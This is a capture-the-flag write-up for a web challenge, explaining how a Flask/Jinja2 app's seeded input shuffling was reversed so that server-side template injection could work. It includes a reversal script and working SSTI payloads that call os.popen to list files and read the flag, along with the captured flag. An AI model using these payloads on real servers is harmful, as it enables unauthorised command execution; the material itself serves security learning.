# Winds

## Description
```
Challenge: https://winds.web.actf.co/
```

## Provided Files
```
- app.py
```

## Writeup

Starting off, I inspected the provided `app.py` file. <br/>
The vulnerability I found inside was `missing input sanitization` on the input of the used `template`. <br/>
This would create a `Server-Side-Template-Injection` vulnerability which can be used to execute shell-code on the server. <br/>
The challenge hereby would be to bypass the `jumbling` of our input. <br/>
```py
random.seed(0)
jumbled = list(text)
random.shuffle(jumbled)
jumbled = ''.join(jumbled)
```

Knowing the seed used in the randomization, we can predict the exact output of our input. <br/>
If we can predict it we can insert a malicious payload to execute `SSTI`. <br/>
To test my guess I used a simple `template injection` using `{{config}}`. <br/>
The reversed version of it would be `gcinfo}{{}` which I reversed manually. <br/>

The result of the `SSTI` can be seen below. <br/>
```sh
Your voice echoes back: <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}> 
```

Knowing that it works I wrote a small python script which automates the `pre-jumbling` process. <br/>
```py
import random

# string with known chars to reverse indexes
empty = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"§$%&/()=?*+~-_#.:,;[]{}ß@`´^°öäü'


# "randomly" jumble input
def get_jumbled(text):
    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    return ''.join(jumbled)

# allocate characters to certain positions in order to reverse it after jumble
def get_alloc(length):
    alloc = {}

    for i, char in enumerate(empty[:length]):
        alloc[char] = i

    return alloc


## SSTI input to generate pre-jumbled exploit 
ssti = '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag.txt").read()}}'

## Used payloads:
# Payloads from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python

## Check if SSTI works
# {{config}}
# gcinfo}{{}
# {{"".__class__.__mro__[1].__subclasses__()}}
# "_)_u_sccb_{sa__(1le_as.}s}r._s__{[o_.]l"m_s

## List files
# {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}
# iTc_c)_els_eeltc_"oaals_fi.s_r.ep(t_(xrposoet).mn}oeR}p_ry_fe.a_ldb{c.nene"l{gel_..nte

## Read flag
# {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag.txt").read()}}
# a.e._)ee{ccsafeimt r_n_{ngptcc_il(ys.nrtoa"xl)oRl}_el}eps__e(.apxde_f_.l.c"tfetaorg.ene.__tToblt



jumbled = get_jumbled(empty[:len(ssti)])
# print(jumbled)

alloc = get_alloc(len(ssti))
# print(alloc)


## -- generate dictionary with correct index-positions --

out = {}

for i, char in enumerate(jumbled):
    out[str(alloc[char])] = ssti[i]


# -- Generate pre-jumbled ssti from allocation dictionary --

result = ''

for i in range(len(ssti)):
    result += out[str(i)]

print(result)
```

The script essentially uses a known string `0123456789abcdefghijklmnopqrstuvwxyz...` to remember the positions of changed characters. <br/>
The `SSTI` input will then use these known positions to rearrange the `SSTI-payload` correctly. <br/>
Using the payloads above from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) I was able to exploit the server and obtain the flag `actf{2cb542c944f737b85c6bb9183b7f2ea8}` and concludes this writeup.